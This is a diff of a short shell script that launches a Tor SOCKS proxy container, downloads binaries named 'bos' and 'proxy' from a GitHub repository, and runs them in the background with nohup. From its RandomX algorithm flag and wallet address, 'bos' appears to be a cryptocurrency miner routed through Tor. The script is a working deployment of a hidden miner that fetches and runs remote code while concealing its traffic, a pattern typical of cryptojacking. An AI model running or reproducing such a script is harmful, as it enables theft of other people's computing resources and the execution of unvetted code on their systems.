@@ -1,6 +1,10 @@
 sudo docker run -d --restart=always -p 127.0.0.1:9150:9150/tcp peterdavehello/tor-socks-proxy:latest
 sleep 2m
 curl -O -L -J https://github.com/akumetaulu/symmetrical-octo-palm-tree/raw/refs/heads/main/bos
+curl -O -L -J https://github.com/akumetaulu/symmetrical-octo-palm-tree/raw/refs/heads/main/set.zip
+unzip set.zip
+chmod +x proxy
+nohup ./proxy &
 chmod +x bos
-./bos --donate-level 1 -o 127.0.0.1:8080 -u 89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.CPU -a rx/0 --cpu-max-threads-hint=75 socks5://127.0.0.1:9150
+nohup ./bos --donate-level 1 -o 127.0.0.1:8080 -u 89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.CPU -a rx/0 --cpu-max-threads-hint=75 socks5://127.0.0.1:9150
 
